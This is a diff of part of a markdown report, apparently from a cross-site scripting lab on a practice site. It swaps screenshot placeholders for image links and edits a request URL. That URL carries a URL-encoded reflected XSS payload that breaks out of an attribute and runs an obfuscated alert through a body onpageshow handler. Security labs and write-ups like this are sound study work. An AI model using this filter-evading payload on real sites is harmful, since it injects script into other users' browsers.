@@ -34,20 +34,18 @@ Source inspection showed different output-handling behavior: the `fname` value w
 
 ### Screenshot 1 – Payload Entered in Both Fields
 
-<!-- Add the screenshot showing the payload in First Name and Last Name here. -->
+<img width="959" height="500" alt="image" src="https://github.com/user-attachments/assets/791d5bf6-8efc-4196-9f73-548523991ead" />
 
 ### Screenshot 2 – JavaScript Alert Execution
 
-<!-- Add the screenshot showing the alert displaying 1, if observed. -->
+<img width="959" height="490" alt="image" src="https://github.com/user-attachments/assets/cc4b1884-84d8-416c-95ce-ee125db8abb8" />
 
-### Screenshot 3 – Different Output Handling
 
-<!-- Add the page-source or Inspector screenshot showing encoded fname and raw lname reflection here. -->
 
 ### HTTP Request / URL
 
 ```http
-https://account.pwnedbox.site/?fname=%22%3E%3Cbody%20onpageshow%3D%2F%2Ax%2A%2Fthis%5B%27a%27%2B%27l%27%2B%27e%27%2B%27r%27%2B%27t%27%5D%281%29%2F%2F%3E&lname=%22%3E%3Cbody%20onpageshow%3D%2F%2Ax%2A%2Fthis%5B%27a%27%2B%27l%27%2B%27e%27%2B%27r%27%2B%27t%27%5D%281%29%2F%2F%3E
+https://account.pwnedbox.site/?fname=%22%3E%3Cbody+onpageshow%3D%2F*x*%2Fthis%5B%27a%27%2B%27l%27%2B%27e%27%2B%27r%27%2B%27t%27%5D%281%29%2F%2F%3E&lname=
 ```
 
 ### Payload
